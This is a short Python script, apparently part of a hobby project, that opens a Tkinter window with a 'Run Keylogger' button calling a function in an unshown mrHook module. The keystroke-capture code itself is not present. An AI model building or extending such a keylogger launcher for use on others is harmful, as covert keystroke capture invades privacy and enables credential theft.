'''
Created on 27 oct. 2012

@author: Lois Aubree
'''

import Tkinter
import mrHook

top = Tkinter.Tk()
top.title("ma fenetre")
button = Tkinter.Button(top,text = "Run Keylogger",command = mrHook.RunKeyCallBack)
button.pack()
top.mainloop()